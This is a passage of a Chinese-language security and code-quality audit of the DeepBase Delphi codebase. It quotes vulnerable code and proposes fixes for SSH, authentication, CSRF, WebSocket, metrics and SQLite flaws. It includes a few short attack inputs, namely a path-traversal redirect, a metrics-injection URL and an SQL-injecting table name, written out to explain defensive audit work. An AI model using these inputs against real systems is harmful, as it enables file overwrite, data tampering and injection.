**建议**：未实现规则返回 `vsWarning('not implemented')` 并在 `Validate` 汇总里计数；发布/封版门禁要求"0 条 not-implemented"。

#### G-Y24 🟡 Validation 缓存不因 KeyResolver 变更失效
**文件**：`Governance\DeepBase.Governance.Validation.pas:493-557`（配合 `ProjectionResolver.pas:30-31` 的 `FCache/FCacheContext`）
**建议**：注册表版本号 + 缓存代际失效；`ProjectionResolver.RefreshAll` 由 `Runtime.pas:135-136` 在每次 commit 后全量刷新（性能与语义都粗糙）。

#### G-Y25 🟡 JsonLogic `ResolveVar` 返回未 Clone 的上下文引用，与 `Manage` 登记机制并存有双重释放风险
**文件**：`d:\_Progs\02Business\DeepBase\Governance\DeepBase.Governance.JsonLogic.pas:160-161`（另 `:487` `OpNot` 空参返回 `True`）
**说明**：`:160-161` 直接把传入 `AData` 的子节点引用返回；若该节点随后被 `Manage` 登记（引擎 finalization 时统一 Free），而外部上下文 JSON 也被调用方释放 → double-free 风险。当前证据链未闭合（见 §5-Q4），故列 🟡。**`OpNot` 空参返回 True 与 JsonLogic 规范一致但语义可疑**（`{"!":[]}` → true）。
**建议**：返回深拷贝或明确"仅借用、禁止 Manage"；为引擎补递归深度/节点数上限（现无上限 → 恶意规则可栈溢出）。

#### G-Y26 🟡 治理层吞异常清单（异常路径资源/证据丢失）
| 位置 | 片段 | 后果 |
|---|---|---|
| `Governance\DeepBase.Governance.Lifecycle.pas:279-284` | `except on E: Exception do ;` | AI steering 模型导出失败静默，`FStarted:=True` 仍报"治理已启动" |
| `Governance\DeepBase.Governance.ObserveGateResolver.pas:89-92` | `except // 空` | observe 模式的"本应阻挡"证据丢失 → 灰度期无任何拦截记录 |
| `Governance\DeepBase.Governance.JsonLogicEvaluator.pas:85-90` | `on E: Exception do Result := False;` | 表达式恒错 → 门禁恒拒且零诊断 |
| `Governance\DeepBase.Governance.EvidenceRecorder.pas:208-210` | `except // Swallow flush errors` | 关停时批量证据丢失且无告警 |
| `Governance\DeepBase.Governance.EvidenceRecorder.pas:421-423` | `except` 包裹失败回调 | 证据保存失败的最后一道通知渠道也被吞 |
| `Governance\DeepBase.Governance.RouteResolver.pas:139-141` | `except Continue` | 路由规则错误静默降级（见 G-R12） |
| `Governance\DeepBase.Governance.EvidenceStore.SQLite.pas:233-281` | `on E: EDatabaseError do ;` ×6 | 迁移失败与"列已存在"不可区分（T-Seed-R07 同型） |
**建议**：治理层所有 `except` 至少 `OutputDebugString` + 计数器；关键路径（证据写库失败）必须向上冒泡为可观测状态。

#### G-B27 🔵 `ConfigLoader`/`Schema` 两处独立实现同一 kind 映射且大小写行为不同
**文件**：`Governance\DeepBase.Governance.Schema.pas:231-240`（`SameText`）与 `Governance\DeepBase.Governance.ConfigLoader.pas:117-126`（`S = 'permission'` 大小写敏感）
**说明**：同一配置串 `'SEAL'` 经两条路径得到 `gckSeal` 与 `gckState` 两种不同 kind；两处都用 `else` 把未知值静默降级（`gckState`）。典型 SSOT 违反 + 静默降级。
**建议**：合并为 `Schema.StrToCondKind` 单一入口，未知值必须报错而非降级。

#### G-B28 🔵 `ReviewQueue.pas:183-185` 内联 `SCOPE_NAMES` 与 `TReviewQueueSQLite.ScopeToStr` 同表双份
**说明**：注释自陈"verifier 不依赖 SQLite 单元，故内联"，代价是裁决作用域字符串有两处真源，改一处即恒不匹配（当前表现为静默拒绝，难诊断）。
**建议**：把 `TAuthorizationScope ↔ string` 映射下沉到 `Types` 单元，两处共用。

#### G-B29 🔵 拼串 O(n²) 与全表扫描（性能）
`ReviewQueue.SQLite.pas:366-394`（`ArrayToJson`/`Result := Result + ...` 循环）、`EvidenceStore.SQLite.pas`（链校验全表读）
**建议**：`TStringBuilder`；链校验增量进行（记录已校验水位）。

### 2.4 治理层的接入状态（架构维度核心结论）

#### G-R14 🔴 治理门禁未接入任何真实执行路径；存在平行"全放行"实现
**证据**：
1. 全仓检索 `Governance` 单元的产品侧引用者，唯一功能性引用为
   `d:\_Progs\02Business\DeepBase\Features\DeepBase.Speech.Policy.pas:44-67`：
   ```pascal
   // :44-53
   Result := True;                    // 硬编码放行（placeholder）
   // :58-67  RegisterGates 内所有 gate 注册语句均被注释掉
   ```
2. VCL 侧存在**平行实现**：`d:\_Progs\02Business\DeepBase\VCL\DeepBase.VCL.DeepShell.Governance.pas:9`、`:64-76`、`:101-140` 的 `TShellAllowAllGovernanceService` 对每个 gate 判定恒 `True`，被 UI 实际调用。
3. CI 不编译该层：`d:\_Progs\02Business\DeepBase\.github\workflows\delphi-ci.yml:42` 的 profile 列表不含 `Governance`，也不含 `Tools`。
**说明**：这构成三重问题 —— (a) **门禁逻辑有第二真源**（`TShellAllowAllGovernanceService` 与 `TGateResolver`/`ObserveGateResolver` 是两套判定，UI 用前者）；(b) **无 SSOT**（同一个"能否执行"问题在 Runtime/ActionGrid/ActionExecutor/Speech.Policy/VCL 五处各自回答）；(c) 治理层 42 个单元、约 25 万字节代码在当前装配下**不参与任何实际拦截**，上述 G-R01~G-R14 全部属于"潜在缺陷"而非"在役缺陷"，但同时意味着任何项目按 README 接入后会立即继承这些缺陷。
**建议修复**：① 为 VCL/Speech 删除本地 allow-all 实现，统一注入 `IOCGSRuntime`；② 把 `Governance`+`Tools` 加入 CI profile；③ 增加"门禁必须被调用"的架构测试（例如以 `Runtime.EnterGate` 计数器断言执行路径经过它）。

---

## 3. Tools 层发现

### 3.1 `Tools\CLI\`（8 个 .pas）

#### T-CLI-R01 🔴 SSH 模块后端恒为 mock：连接/执行/上传/下载全部伪造成功，并用假内容覆盖本地文件
**文件**：`d:\_Progs\02Business\DeepBase\Tools\CLI\DeepBase.CLI.SSH.pas`
```pascal
// :429
  /// <summary>Create SSH backend (returns mock by default)</summary>
// :449
  Result := TMockSSHBackend.Create;
// :620 (TSSHSession.Connect)
  FBackend := CreateSSHBackend;
// :1413-1417
  if FMockResponses.TryGetValue(Command, Result) then Exit;
  // Default response for unknown commands
  Result := TSSHResult.OK('Mock output for: ' + Command);
// :1420-1425
function TMockSSHBackend.Upload(const LocalFile, RemotePath: string): Boolean;
begin
  Result := FConnected and TFile.Exists(LocalFile);
// :1427-1436
function TMockSSHBackend.Download(const RemotePath, LocalFile: string): Boolean;
begin
  Result := FConnected;
  if Result then
    TFile.WriteAllText(LocalFile, 'Mock content from ' + RemotePath);
```
**说明**：`CreateSSHBackend` 无 DI 注入点、无配置开关、无 `IFDEF`，`:620` 硬绑定 mock。因此整个 SSH 子系统（含连接池、别名管理、异步获取、清理线程，共 1470 行真实工程代码）**没有任何一种方式连接真实主机**，但对外 API 与真实实现完全同形：
- `Execute`：**未知命令一律返回 OK**（连"命令不存在"都不报）；
- `Upload`：只做本地 `File.Exists` 判断，**未传输任何字节**即返回 True；
- `Download`：**用一行假字符串覆盖调用方指定的本地文件路径**并返回 True —— 这是可造成真实数据销毁的行为（调用方完全不知道被覆盖）；
- 单元测试/上层逻辑（部署脚本、批量下发）会把这些假成功当作真实结果。
**触发条件**：任何调用 `TSSHClient.Execute/Upload/Download` 的代码路径。
**建议修复**：① 立刻在 mock 返回体里注入显式失败（`TSSHResult.Error('SSH backend not implemented')`）或让 `CreateSSHBackend` 抛 `ENotImplemented`；② 若要保留 mock，必须通过 DI 显式注入且在 `Connect` 里置 `FIsMock=True`，所有返回码降级为 warning；③ 删除 `Download` 的写文件副作用；④ CI 增加"不得静默返回 mock 成功"的门禁。

#### T-CLI-R02 🔴 连接池：锁外 `Connect` + `doOwnsValues` 删除 → 正在连接的对象被释放（UAF）
**文件**：`Tools\CLI\DeepBase.CLI.SSH.pas:866-920`（另 `:835-864`、`:999-1035`、`:771-777`）
```pascal
    Session := TSSHSession.Create(Key);
    FSessions.Add(Key, Session);
  finally
    FLock.Leave;
  end;

  // Connect outside lock
  if not Session.Connect(Options, Credentials) then
```
**说明**：会话在锁内登记、锁外连接。并发同 key 的第二线程在 `:879` 看到 `IsConnected=False` → 走 `:885 FSessions.Remove(Key)`，而 `FSessions` 是 `TObjectDictionary<.,TSSHSession>.Create([doOwnsValues])`（`:787`）→ **第一线程正在 `Connect` 的对象被 free**，随后对其字段读写即 UAF。同类问题还有三处：
- `:835-864` `DoCleanupIdleSessions` 在**持锁状态下调用 `FSessions[Key].Disconnect`**（网络 I/O 进锁 → 全池串行化/长阻塞），并且空闲回收会释放调用方仍持有的 session（`TSSHClient.FCurrentSession`，`:1175`）→ UAF；
- `:999-1035` `GetSessionAsync` 用 `TThread.CreateAnonymousThread(...).Start`，**线程不被跟踪也不 join**，池析构后线程仍在 `GetSessionWithTimeout` 中触碰已释放的 `FLock/FSessions` → UAF；且 `TThread.Synchronize(nil,...)` 在主线程阻塞（`WaitFor` 池析构）时**互相死锁**；
- `:771-777` `TSSHCleanupThread.Stop`: `if Started then WaitFor;` —— `Started` 是瞬时属性，`Start` 之后线程尚未真正进入执行时判定为 False → **跳过 WaitFor**，紧随其后的 `FStopEvent.Free`（`:738`）把仍在 `WaitFor(FInterval)` 的事件释放 → UAF；`:746-768` 只处理 `wrTimeout/wrSignaled`，未处理 `wrError/wrAbandoned` → 事件句柄异常时**忙循环**。
- `:1037-1049` `ReleaseSession` 不做检出记账（会话被借出后仍可被他人 `IsConnected` 命中并发使用），auto-reset `FAvailableEvent`（`:794`）+ 多等待者 → 唤醒丢失/饿死；
- `:827` `GetSessionKey` 用 `Format('%s@%s:%d')` 不转义 → `user='a@b'` 与不同 host 组合可**键碰撞**，导致串会话（凭据错配）。
**触发条件**：两线程同时首次连接同一主机（GUI + 后台任务），或关停时序竞态。
**建议修复**：改为"per-key 建锁 + 状态机（Creating/Ready/Busy）"，连接期间占位对象对其他线程可见为 `arBusy`；所有权从字典显式接管（`Extract` 而非 `Remove`）；异步获取用可取消的任务对象并纳入池生命周期；`Stop` 无条件 `WaitFor`；key 用 `HH:MM` 式长度前缀编码或结构化元组。

#### T-CLI-R03 🔴 host-key 校验默认接受（TOFU fail-open）
**文件**：`Tools\CLI\DeepBase.CLI.SSH.pas:1371-1382`
```pascal
  if Assigned(FOnHostKey) then
  begin
    Accept := True;
    FOnHostKey(FHost, 'mock:fingerprint:12:34:56:78:90:ab:cd:ef', Accept);
```
**说明**：① 未挂 `FOnHostKey` 事件时**整段校验被跳过**；② 挂了事件也把 `Accept` 预置为 `True`，回调不改即通过。MITM 无需其他条件即可成立。（当前因后端恒 mock 而不"可利用"，但这正是 mock 掩盖缺陷的典型。）
**建议修复**：`Accept := False` 起始 + 首次指纹入 known_hosts 持久化比对；无回调视为拒绝。

#### T-CLI-R04 🔴 管道重定向：`TComparer` 泄漏 + 非引号感知切分 + 任意路径写 + 条件性 UAF
**文件**：`d:\_Progs\02Business\DeepBase\Tools\CLI\DeepBase.CLI.Pipeline.pas`
```pascal
// :98-107
procedure TPipelineStage... (RouteResolver 同型)
// :804-835
    if TrimmedPart.Contains('>>') then
      var RedirParts := TrimmedPart.Split(['>>']);
      Stage.TargetFile := Trim(RedirParts[1]);
// :1162-1173
  TFile.WriteAllText(FileName, Content, TEncoding.UTF8);
// :1045-1050
        var NextData := ExecuteStage(Stage, CurrentData);
        if CurrentData <> FStdinData then
          CurrentData.Free;
        CurrentData := NextData;
```
**说明**：
1. **内存**：全仓 `TList.Sort(TComparer<T>.Construct(...))` 共 25+ 处（本目录内 1 处，另见 Studio 3 处、LogAnalyzer 4 处）——`Construct` 返回的 comparer **由调用方负责释放**，`Sort` 不接管所有权 → **每次调用泄漏一个小对象**（`RouteResolver.pas:102` 是每 AddRule 一次，`BackupFrame.pas:261` 是每次刷新列表一次）。
2. **正确性**：作者已实现 `SplitByPipe`（引号感知）却用裸 `Split(['>'])`/`Split(['>>'])` 解析重定向 → `grep "a>b" f` 被误判为命令+重定向；`foo > a > b` 只取 `a`，`b` 丢失。
3. **安全**：`WriteDataToFile` 对 `TargetFile` **无任何目录约束/规范化**（`TFile.WriteAllText(FileName,...)`）→ 能提交 pipeline 字符串的地方即可以 `> ..\..\Startup\x` 任意路径写文件。
4. **生命周期**：`:1045-1050` 若自定义 `FCommandExecutor` 返回的正是传入的 `Input` 对象（很自然的"透传"实现），`:1047` 的 `<> FStdinData` 判定会**释放刚返回的对象**，随后 `CurrentData := NextData` 指向已释放内存 → UAF。契约（"ExecuteStage 不得返回 Input 本身"）未在任何地方声明。
**建议修复**：统一 `with TComparer<T>.Construct(...) do try ... finally Free end`（或提供 `SortBy` 辅助）；重定向解析复用 `SplitByPipe` 的引号状态机；`TargetFile` 做 `TPath.GetFullPath` + root 约束校验；ExecuteStage 明确"必须返回新对象"并加 `Assert(NextData <> Input)`。

#### T-CLI-Y05 🟡 CLI 命令半成品：交互命令未实现即返回 Error，Markdown 输出降级为纯文本
**文件**：`Tools\CLI\DeepBase.CLI.Interactive.pas:1280-1281`、`:1126`
```pascal
    PrintError('Command not implemented: ' + Context.Command);
    Exit(TCommandResult.Error('Not implemented'));
// :1126
  FFormatters.Add(ofMarkdown, TTextFormatter.Create);  // Use text for now
```
**说明**：`ofMarkdown` 注册的是 `TTextFormatter`，用户 `--format markdown` 得到的是 text 输出且**无任何提示**（输出格式静默错误，下游脚本按 markdown 解析即失败）。未实现命令返回 `Error`（至少不假成功）→ 定 🟡。
**建议修复**：未支持格式显式报 `unsupported format`；`Interactive.pas:1372` 的 `Lines.SaveToFile(FileName)` 需补 try/except 与路径校验。

#### T-CLI-Y06 🟡 `CLI.Commands` 相对路径直接以当前目录拼接，无边界
**文件**：`Tools\CLI\CLI.Commands.pas:279`（`TPath.GetFullPath(TPath.Combine(GetCurrentDir, Path))`）
**建议**：涉及导入/导出/备份的写目标统一走一个 root-confinement 辅助函数（Tools 内当前有 4 处独立实现，见 §3.3/§3.7）。

#### T-CLI-Y07 🟡 CLI 吞异常
**文件**：`Tools\CLI\CLI.DB.pas:200`、`Tools\CLI\DeepBase.CLI.Pipeline.pas:377`、`Tools\CLI\CLI.Config.pas:512`
**建议**：至少输出 `E.ClassName`；导出非零退出码，避免"脚本以为成功"。

### 3.2 `Tools\WebService\`（5 个 .pas）

#### T-WS-R01 🔴 refresh token 可直接当作 access token 使用（`type` claim 不校验）
**文件**：`d:\_Progs\02Business\DeepBase\Tools\WebService\DeepBase.WebAPI.Auth.pas:1002-1036`（对照 `:989`）
```pascal
// GetUserFromToken：只校验签名与过期，从不读取 type claim
  if not ValidateToken(AToken, LPayload) then ...
// :989 (RefreshToken 路径才有)
  if LPayload.GetStringClaim('type') <> 'refresh' then ...
```
**说明**：两类 token 共享同一签名/算法/签发函数，唯一区别是 `type` claim 与 7 天有效期。access 校验侧不看 `type` → **把 7 天、且不受 access 撤销策略约束的 refresh token 直接放进 `Authorization:` 头即可长期访问全部受保护 API**。
**触发条件**：任何拿到 refresh token 的路径（日志、移动端存储、被窃的刷新响应）。
**建议修复**：`GetUserFromToken` 强制 `type = 'access'`；access/refresh 使用不同签名密钥或不同 `aud`；补必失败用例（refresh 当 access 必须 401）。

#### T-WS-R02 🔴 CSRF 令牌与会话/用户零绑定（Cookie 解析未实现）
**文件**：`Tools\WebService\DeepBase.WebAPI.Auth.pas:1777-1853`
```pascal
// :1805-1806
      LCookieToken := AContext.Request.GetHeader('Cookie');
      // 简化处理：实际应解析 Cookie
// :1833-1839
        if (LNow - LTimestamp) > LExpiry then ...
// :1842-1843
        LExpectedToken := THashSHA2.GetHashString(Parts[0] + LSecret, SHA256);
        if not SameText(LExpectedToken, Parts[1]) then ...
```
**说明**：double-submit 校验只做"提交头自洽"（用 `Parts[0]` 重算再比对 `Parts[1]`），**从不与 Cookie 中的服务端令牌比对**（`LCookieToken` 赋值后从未使用），因此攻击者可自行 mint 一个合法格式的 `random‖hash` 头，跨站提交时**不需要知道任何用户态秘密** → CSRF 防护形同装饰。三个次要缺陷：① `SHA256(msg‖key)` 是 naive MAC，MD 结构下存在长度扩展风险（应 HMAC-SHA256）；② `SameText` 非常量时间；③ 不拒绝**未来**时间戳 → 令牌永不过期。
**触发条件**：任意外部页面发起带自定义头的跨站请求（预检失败可用 `text/plain`  tricks 或直接由已获取的 JS 上下文发起）。
**建议修复**：解析 Cookie 得到服务端会话令牌并强比对；绑定 session id；HMAC + 常量时间比较 + `Abs(LNow - LTimestamp) > LExpiry`。

#### T-WS-R03 🔴 授权中间件闭包捕获活 `TStringList` → 悬垂指针；空角色集=只认证不授权
**文件**：`Tools\WebService\DeepBase.WebAPI.Auth.pas:1641-1702`、`:1663`、`:1729`、`:1618-1624`、`:1607-1614`
```pascal
// :1646
  LRoles := FRequiredRoles;              // 捕获的是同一个对象引用
...
// :1707-1713（同类另一函数，作者自己写明了正确做法）
  // 显式复制，避免依赖实例对象生命周期
// :1663 / :1729
  if LRoles.Count > 0 then
  begin
    ... 角色比对 ...
  end;                                   // 空列表 → 不比对，直接 ANext
// :1618-1624
function ...GetOptionalMiddleware: TMiddlewareFunc;
begin
  Result := nil;                         // 半成品
end;
```
**说明**：① 路由表里长期持有的闭包捕获了 `TAuthorizationMiddleware` 实例的 `FRequiredRoles` **对象本身**；中间件实例被释放（重建路由/配置热更新）后，闭包访问已释放的 `TStringList` → AV/读垃圾角色并据此放行。同文件另一函数（`:1707-1713`）已用复制并留下注释说明原因 —— **同一单元内两种口径，是典型的第二真源**。② `if LRoles.Count > 0` 把"要求角色为空"解释为"不检查角色"：配置加载失败/角色名拼错导致列表为空时 → **认证即授权**（fail-open）。③ `GetOptionalMiddleware` 返回 `nil`，调用方若把它加入中间件链即 `()` 调用 nil 参考 → AV（是否已有人在调未知，见 §5-Q5）。④ `:1607-1614` `finally LUser.Free` 释放已被 `:1597 AContext.SetItem(TAuthContextKeys.User, LUser)` 存入的对象，异步/长连接侧取用即悬垂。
**建议修复**：捕获 `Roles: TArray<string>` 副本；空角色集显式区分"无要求"（须配置项声明）与"配置错误"（默认拒绝，要求 `RequireRoles` 至少一项或 `AllowAnonymous`）；`GetOptionalMiddleware` 未实现前抛 `ENotImplemented`；`LUser` 交给 `AContext` 所有权或改为记录值类型快照。

#### T-WS-R04 🔴 WebSocket：缺 Origin 即放行 + 握手全程无认证
**文件**：`d:\_Progs\02Business\DeepBase\Tools\WebService\DeepBase.WebAPI.WebSocket.pas:911-927`、`:1053-1131`
```pascal
// :915-916
  if Trim(AOrigin) = '' then
    Exit(True);
```
**说明**：Origin 白名单是 CSWSH（跨站 WebSocket 劫持）的唯一防线，而"空 Origin 放行"把它整体拆掉（WebSocket 握手可被非浏览器客户端任意构造，浏览器侧也有办法缺省 Origin）。更根本的是 `HandleUpgrade` **完全不校验 JWT/API Key**，也不经过 HTTP 中间件链 → 任何 TCP 可达者都能升级为已认证连接（协议层身份若后续消息补交则另论，见 §5-Q6）。
**建议修复**：缺 Origin → 拒绝（除纯本地 CLI 客户端）；升级前复用 `TApiContext` 的认证中间件；连接对象绑定身份，后续帧不再接受身份切换。

#### T-WS-R05 🔴 WebSocket 每条连接永久泄漏（字典不 owns 且从不 Free）
**文件**：`Tools\WebService\DeepBase.WebAPI.WebSocket.pas:940`、`:1143-1151`（另 `:656-681`、`:734-770`、`:960-1023`、`:1153-1161`）
```pascal
// :940
  FConnections := TObjectDictionary<string, TWebSocketConnection>.Create([]);
// :1143-1151
procedure ...RemoveConnection(AConnection: TWebSocketConnection);
begin
  ...
  FConnections.Remove(AConnection.Id);   // 全文无任何 .Free
end;
```
**说明**：`Create([])` 明确表示不接管值所有权，而 `RemoveConnection` 只 `Remove` —— 每个连接对象及其 `FHeaders`/`FUserData`/`FRooms`（内部还各有 `Create`）**永不释放**，直到服务停机。附带三个缺陷：`:964-991` 心跳线程 `while FRunning do Sleep(PingInterval)` 不可中断，`StopPingThread` 用 `Terminate; WaitFor` → **关停最长阻塞 30 秒**（`FRunning` 非 volatile/未 Interlocked）；`:760-761` `while FRooms.Count > 0 do Leave(FRooms[0])` 依赖 `Leave` 必然缩短列表，`:693-701` 的 `FRooms.Delete(FRooms.IndexOf(...))` 在 IndexOf=-1 时抛异常 → **死循环**并跳过 `:768 RemoveConnection`（死连接留在表中被持续 ping）；`:993-1023` `DoPing` 锁外遍历快照并 `except // 忽略`，把上述 UAF/AV 全部吞掉。
**建议修复**：`Create([doOwnsValues])` 或在 `Remove` 后 `Free`；线程改用 `TEvent.WaitFor` 可中断等待；`Leave` 先判 `IndexOf >= 0`；ping 异常须断连而非忽略。

#### T-WS-R06 🔴 multipart 解析经 UTF-8 文本往返 → 二进制上传静默损坏；文件名未净化；无请求体上限
**文件**：`d:\_Progs\02Business\DeepBase\Tools\WebService\DeepBase.WebAPI.Core.pas:697-766`、`:749-758`、`:958-983`、`:210`
```pascal
// :712
  LBodyStr := AContext.Request.GetBodyAsString;      // 二进制被当文本解码
// :756
      LFile.Data := TEncoding.UTF8.GetBytes(LContent);  // 再编码回字节
// :749-758
      LFile.FileName := LFileName;                   // 保留客户端原始路径
// :974-983
  SetLength(FBody, AStream.Size);                    // Int64 → Integer 溢出面
```
**说明**：① 上传的图片/zip/exe 经 `GetBodyAsString → UTF8.GetBytes` 往返，**任何非 UTF-8 可round-trip 字节序列（≥0x80、代理对、无效序列）都会改变内容** → 文件静默损坏（大小、哈希全不同，且服务端返回 200）；文件内容含 boundary 或 CRLF 时解析直接错乱。② `FileName` 保留客户端提供的完整路径（未 `ExtractFileName`），上层保存即路径遍历写文件。③ 全单元无请求体大小上限（`FMaxFrameSize` 只在 WebSocket 侧），大 body 全量入内存 → 内存 DoS。④ `SendFile`（`:958-972`）无 root 约束/路径规范化、`TFile.Exists→ReadAllBytes` 有 TOCTOU、整文件入内存；`SendStream` 用 `SetLength(FBody, AStream.Size)` 把流整体读入且对 >2GB 抛 EOverflow。⑤ `ACookie(..., ASecure: Boolean = False)`（`:210`）默认不 Secure。
**建议修复**：multipart 必须走 `TBytesStream`/原始字节解析（不经 string）；`ExtractFileName` + 白名单字符；加 `MaxRequestBodyBytes` 并在读前检查 `Content-Length`；`SendFile` 提供 root-confinement 重载并用流式发送；Cookie 默认 Secure + HttpOnly。

#### T-WS-R07 🔴 `/metrics`：原始 URL path 作为标签 + 标签值不转义 → 无界基数内存 DoS + 指标注入
**文件**：`d:\_Progs\02Business\DeepBase\Tools\WebService\DeepBase.WebAPI.Observability.pas:741`、`:465-472`（另 `:549-557`、`:621-622`）
```pascal
// :739-743
        LLabels.Add('method', ...);
        LLabels.Add('path', AContext.Request.Path);      // 未归一化
        ACollector.Counter('http_requests_total', 'Total HTTP requests', LLabels);
// :465-466（序列化）
          LLines.Add(Format('%s{%s} %s',
            [FName, LPair.Key, FormatMetricValue(LPair.Value)]));
```
**说明**：① `Request.Path` 直接进标签，`FHistograms`/`FValues` **无上限、无过期、无清理路径** → 每个唯一 URL 生成新时间序列，攻击者以 `/x/1`,`/x/2`,… 循环请求即可让服务端内存无界增长，同时 `/metrics` 响应体线性膨胀（Prometheus 抓取超时 → 可观测性自身失效）。这是 CWE-770。② `LabelsKey` 生成的串按原样写入 `%s{...}`，标签值中的 `"`、`\`、换行未转义 → 请求 `/a%22,b%3D%22c%0Afake_metric%201` 即可在 `/metrics` 输出里**伪造任意指标行**，污染下游告警/容量决策。③ `:742-757` 在请求开始即 `Counter`，`status` 标签在响应发送后才补 → `Response.Sent=False` 的异常/500 路径**不计入 `http_responses_total`**，错误率监控存在系统性盲区；④ `:754` 复用同一 `LLabels` 实例（含 status）与前面已注册的序列 key 不一致，同一 path 的 requests/responses 标签集不同。⑤ `:549-557` 注释承认"EnsureMetric 也在无锁下被公有方法调用"（实际三处均在锁内 → 陈旧误导注释）；`:621-622` `SetLength(LSnapshot, ...)` 后立刻被 `ToArray` 覆盖（无意义分配）。
**建议修复**：用**已注册路由模板**（`/users/{id}`）而非原始 path 作标签，并设标签值集合上限；`EscapeLabelValue`（`\`、`"`、换行）；status 移到 `finally` 且未发送时记 `status="error"`；`/metrics`、`/health`（`:683-715`，`RunAll` 暴露依赖健康详情）注册时强制挂只读角色中间件（当前两函数自身不做任何鉴权，鉴权完全依赖调用方装配 → 见 §5-Q7）。

#### T-WS-Y08 🟡 API Key/Token 生成路径的随机源缺陷
**文件**：`Tools\WebService\DeepBase.WebAPI.Auth.pas:1204-1252`、`:1307-1322`、`:1369-1378`、`:1416-1417`、`:1057-1060`、`:860-925`、`:967-970`
```pascal
// :1226
  CryptGenRandom(LProv, Length(LRandomBytes), LRandomBytes[0]);   // 返回值未检查
// :1234-1235
      Result[I] := AnsiChar(Random(256));                          // 未 Randomize 的 PRNG
// :1416-1417
  if Random(10) = 0 then CleanupExpired;
```
**说明**：① `CryptGenRandom` 失败时 `LRandomBytes` 保持全零 → 生成的 Key/Secret 可预测（且这是"随机失败才走"的分支，难以复现）；② 回退分支用 `Random(256)` 且该路径无 `Randomize` → 每次进程启动序列相同 = **可预测凭据**；③ `UpdateUsage`（`:1307-1322`）无锁 read-modify-write，并发下丢更新（配额可被超）；④ `CleanupExpired` 概率触发（`:1416`）→ 低流量下速率限制表无界增长；限流键取 `RemoteIP`（可伪造 XFF）→ 限流可绕；⑤ `TApiKeyInfo.IsExpired`（`:1057-1060`）`(FExpiresAt > 0) and (Now > FExpiresAt)` → **0 = 永不过期**（与 `Seal.pas:156-159`、`RouteResolver.pas:131` 同型的"哨兵 0"第三次出现）；⑥ `ValidateToken`（`:860-925`）不比对 header `alg` 与 `FAlgorithm`，且 `:959` 把解析后的 `alg` 放进 Header 记录交给下游 → 经典 `alg` 混淆风险面（此处 `none` 不会被接受，因签名仍要算，故未定 🔴）；⑦ `:967-970` 任意解析异常统一吞成"无效 token"，无法区分攻击尝试与配置错误。
**建议修复**：检查 `CryptGenRandom` 返回值并在失败时抛异常（禁止回退弱 PRNG）；`UpdateUsage` 加锁/Interlocked；清理改为定时任务；`ExpiresAt=0` 显式建模为 `TNil`/`Infinite` 并要求配置项 `AllowNeverExpiringKeys=false`；校验 `alg` 白名单且不向下游透传 header。

#### T-WS-Y09 🟡 WebSocket 响应头双写 / 状态字段无保护 / `GetConnection` 依赖 RTL 行为
**文件**：`Tools\WebService\DeepBase.WebAPI.WebSocket.pas:1092-1103`、`:656-681`、`:1153-1161`
**建议**：`CustomHeaders` 与手写 `IOHandler.WriteLn` 二选一；`FState` 读写纳入 `FLock` 或 `TInterlocked`；`GetConnection` 首行显式 `Result := nil`。

#### T-WS-B10 🔵 中文注释/字面量文件编码不统一
**说明**：`Tools` 内多个 `.pas`（如 `Tools\UniPublisher\Core\Publisher.Targets.pas:359`、`Tools\Tray\Automation\Tray.Automation.pas:448`、`Tools\SeedTool\uAntiTamperPackage.pas:405`、`Tools\Tray\Tray.NotesFrame.pas:112`）出现乱码/被截断的多字节序列，说明这些文件为 ANSI(GBK) 或无 BOM UTF-8 混用。**影响**：`dcc64` 在无 BOM 时按机器 ANSI 代码页解释，跨机器（不同 ACP）构建会产生不同字面量 → 用户可见字符串/日志文本不可移植。定 🟡（构建可重现性），修复：统一为 UTF-8 with BOM 并加 CI 编码检查。
**未发现问题维度**：`Tools\WebService\` 的 ① 正确性中的 `JWT.Verify` 恒定时间比较实现（`Auth.pas:759-786`）经复核**正确**（逐字节 `xor` 累加 + 长度先判），非缺陷；`Observability` 的 `TWebHealthCheckRegistry.RunAll` JSON 生命周期（`:691-698`）所有权处理**正确**。

---

### 3.3 `Tools\Studio\`（数据库管理 Studio，15 项：🔴6 🟡5 🔵3 存疑1）

#### T-STU-R01 🔴 表名/列名/PRAGMA 目标以字符串拼接进 SQL → 恶意 `.db`/`.csv` 触发任意 SQL
**文件**：`d:\_Progs\02Business\DeepBase\Tools\Studio\Frames\Studio.ImportExportFrame.pas:887`、`:898`、`:251`、`:645`、`:702`、`:756`、`:870`、`:972`、`:985`；`d:\_Progs\02Business\DeepBase\Tools\Studio\Frames\Studio.SchemaFrame.pas:303`、`:356`、`:375`、`:416`；`d:\_Progs\02Business\DeepBase\Tools\Studio\Frames\Studio.ProfileFrame.pas:363`、`:503`
```pascal
// ImportExportFrame.pas:887 / :896-898
  SQL := Format('INSERT INTO [%s] (%s) VALUES (', [ATableName, LColumns]);
  ...
  LColumns := LColumns + '[' + Headers[J] + ']';     // Headers 来自 CSV 首行表头
// :251
  LQuery.SQL.Text := Format('SELECT COUNT(*) AS cnt FROM [%s]', [TableName]);
// SchemaFrame.pas:303
  LQuery.SQL.Text := Format('PRAGMA table_info(%s)', [ATableName]);   // 未加引用符
```
**说明**：① `ATableName`/`Headers[J]` 直接用 `[...]` 包裹拼接，但**未对 `]` 做 SQLite 要求的 `]]` 转义**——一个列名/表名为 `a](a)VALUES(1);--` 或含 `]]` 的名称即可闭合括号并追加语句；② `PRAGMA table_info(%s)` 连引用符都没有，含空格/特殊字符的合法表名直接语法错误，含 `)` 的名称可注入 PRAGMA 参数序列；③ 数据源不可信：`TableName` 来自打开的 `.db` 的 `sqlite_master`（`:237`），`Headers` 来自外部 `.csv`。攻击面 = "打开/导入一个别人给的库或 CSV"。
**触发条件**：在 Studio 中打开含恶意表名的 `.db`，或导入含恶意表头的 `.csv`。
**建议修复**：统一走一个 `QuoteSQLiteIdent()`（`[` + StringReplace(`]`,`]]`) + `]`）；PRAGMA 无法参数化，则先对名称做 `^[A-Za-z0-9_]+$` 白名单 + 长度上限校验，不合规直接拒绝并提示；导入前用 `sqlite_master` 现有表名做存在性比对（白名单），不接受 CSV 给出的新列名。
**附注（非缺陷）**：`ProfileFrame.pas:269`、`:295` 的 `'EXPLAIN QUERY PLAN ' + SQL` 是把用户自己写的查询送进 EXPLAIN，属 profiler 设计意图，**不记为注入**。

#### T-STU-R02 🔴 导入的 Truncate（DELETE）发生在事务开启之前 → 失败即不可回滚，数据已毁
**文件**：`Tools\Studio\Frames\Studio.ImportExportFrame.pas:867-872` vs `:877`；JSON 路径同型 `:969-974` vs `:979`
```pascal
